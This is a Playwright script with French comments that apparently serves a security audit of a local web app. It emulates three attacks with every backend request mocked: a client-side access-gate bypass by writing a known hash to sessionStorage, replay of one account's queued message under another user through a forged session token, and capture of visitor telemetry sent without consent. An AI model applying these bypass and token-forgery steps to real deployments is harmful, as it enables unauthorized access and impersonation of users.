// Émulation Chromium (lecture seule : toute requête d'ÉCRITURE vers Supabase est INTERCEPTÉE et
// simulée, rien n'atteint la production). Serveur local attendu sur http://127.0.0.1:8107.
// Trois attaques :
//  A. contournement du gate 2125 par écriture de sessionStorage (hash public) ;
//  B. file de messages `passio_outbox_v1` rejouée sous l'identité du compte SUIVANT (from_id = MY_UID au flush) ;
//  C. télémétrie d'un VISITEUR sans compte : champs envoyés (device_id persistant, user_label) sans consentement.
const { chromium } = require("/home/user/passio-app/node_modules/@playwright/test");
const fs = require("fs");
const OUT = __dirname;
const BASE = "http://127.0.0.1:8107";
const GATE_HASH = "67a2ba44e8c09efc9e9e9d60690ef7cd1e3069d072231a1834b30ec1fc50390f";
const UID_A = "11111111-1111-4111-8111-111111111111";
const UID_B = "22222222-2222-4222-8222-222222222222";
const res = {};
(async () => {
  const browser = await chromium.launch();
  // ── A. gate bypass ─────────────────────────────────────────────────────────
  {
    const ctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
    const page = await ctx.newPage();
    await page.route(/supabase\.co/, r => r.abort());
    await page.goto(BASE + "/index.html");
    await page.waitForTimeout(800);
    res.A_gate_visible_sans_jeton = await page.evaluate(() => !!document.getElementById("passioGate") && document.documentElement.classList.contains("passio-locked"));
    await page.evaluate(h => sessionStorage.setItem("passio_gate_v1", h), GATE_HASH);
    await page.reload();
    await page.waitForTimeout(800);
    res.A_gate_absent_apres_setItem = await page.evaluate(() => !document.getElementById("passioGate") && !document.documentElement.classList.contains("passio-locked"));
    await page.screenshot({ path: OUT + "/A-gate-contourne.png", scale: "css" });
    await ctx.close();
  }
  // ── B. outbox messages rejouée sous une autre identité ─────────────────────
  {
    const ctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
    const page = await ctx.newPage();
    const captures = [];
    await page.route(/supabase\.co/, async r => {
      const u = r.request().url(); const m = r.request().method();
      if (m === "POST" && /rest\/v1\/conv_messages/.test(u)) {
        captures.push({ url: u.replace(/^https:\/\/[^/]+/, ""), body: r.request().postData() });
        return r.fulfill({ status: 201, contentType: "application/json", body: "[]" });
      }
      if (/auth\/v1\/user|auth\/v1\/token/.test(u)) return r.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ id: UID_B, aud: "authenticated", role: "authenticated", email: "b@example.invalid", user_metadata: {}, app_metadata: {} }) });
      if (m === "GET" || m === "HEAD") return r.fulfill({ status: 200, contentType: "application/json", body: "[]" });
      return r.fulfill({ status: 201, contentType: "application/json", body: "[]" });
    });
    await page.addInitScript(([h, a, b]) => {
      sessionStorage.setItem("passio_gate_v1", h);
      // Compte A a laissé un message en file (hors ligne), puis s'est déconnecté : la clé passio_outbox_v1
      // n'est PAS dans ACCOUNT_SCOPED_KEYS (app-02) donc elle survit à purgeAccountScopedData().
      localStorage.setItem("passio_outbox_v1", JSON.stringify([{ convId: "conv_A_B", msgId: "msg_prive_de_A", content: "message privé écrit par A", at: Date.now() }]));
      // Compte B se connecte sur le même navigateur : état onboardé + uid B + jeton SDK de B (session factice).
      localStorage.setItem("passio_uid", b);
      localStorage.setItem("passio_mvp_state_v1", JSON.stringify({ onboarded: true, landingSeen: true, user: { name: "B", general: {}, profiles: [{ id: "p1", passionId: "musique", name: "B" }] } }));
      const exp = Math.floor(Date.now() / 1000) + 3600;
      localStorage.setItem("sb-njkiyoklssvefstljemx-auth-token", JSON.stringify({ access_token: "eyJhbGciOiJIUzI1NiJ9." + btoa(JSON.stringify({ sub: b, aud: "authenticated", role: "authenticated", exp })).replace(/=/g, "") + ".sig", token_type: "bearer", expires_in: 3600, expires_at: exp, refresh_token: "r", user: { id: b, aud: "authenticated", role: "authenticated", email: "b@example.invalid", user_metadata: {}, app_metadata: {} } }));
    }, [GATE_HASH, UID_A, UID_B]);
    await page.goto(BASE + "/index.html");
    await page.waitForTimeout(6000);
    res.B_MY_UID = await page.evaluate(() => (typeof MY_UID !== "undefined") ? MY_UID : null);
    res.B_outbox_restante = await page.evaluate(() => localStorage.getItem("passio_outbox_v1"));
    res.B_inserts_conv_messages = captures;
    res.B_ACCOUNT_SCOPED_KEYS_contient_outbox = await page.evaluate(() => (window.ACCOUNT_SCOPED_KEYS || []).indexOf("passio_outbox_v1") !== -1);
    await ctx.close();
  }
  // ── C. télémétrie visiteur ─────────────────────────────────────────────────
  {
    const ctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
    const page = await ctx.newPage();
    const tel = [];
    await page.route(/supabase\.co/, async r => {
      const u = r.request().url(); const m = r.request().method();
      if (m === "POST" && /rest\/v1\/telemetry_events/.test(u)) { tel.push(r.request().postData()); return r.fulfill({ status: 201, contentType: "application/json", body: "[]" }); }
      if (m === "GET" || m === "HEAD") return r.fulfill({ status: 200, contentType: "application/json", body: "[]" });
      return r.fulfill({ status: 201, contentType: "application/json", body: "[]" });
    });
    await page.addInitScript(h => sessionStorage.setItem("passio_gate_v1", h), GATE_HASH);
    // ?telemetry=1 : en localhost l'opt-in est explicite ; en production le défaut est ON (telemetry.js:71).
    await page.goto(BASE + "/index.html?telemetry=1");
    await page.waitForTimeout(7000);
    res.C_visiteur = await page.evaluate(() => !!(window.PassioFirstRun && PassioFirstRun.estVisiteur()));
    res.C_device_id_persistant = await page.evaluate(() => localStorage.getItem("passio_device_id"));
    res.C_consentement_demande = await page.evaluate(() => /télémétrie|telemetry|cookies|traceur/i.test(document.body.innerText));
    let evs = [];
    for (const b of tel) { try { const j = JSON.parse(b); evs = evs.concat(Array.isArray(j) ? j : [j]); } catch (e) {} }
    res.C_nb_evenements_captes = evs.length;
    res.C_champs_premier_evenement = evs[0] ? Object.keys(evs[0]) : null;
    res.C_exemple = evs[0] ? { type: evs[0].type, action: evs[0].action, device_id: evs[0].device_id ? "(présent, " + String(evs[0].device_id).length + " car.)" : null, user_id: evs[0].user_id, user_label: evs[0].user_label, platform: evs[0].platform, browser: evs[0].browser, screen_size: evs[0].screen_size } : null;
    await ctx.close();
  }
  await browser.close();
  fs.writeFileSync(OUT + "/emul-auth-resultats.json", JSON.stringify(res, null, 2));
  console.log(JSON.stringify(res, null, 2));
})().catch(e => { console.error("ECHEC", e); process.exit(1); });
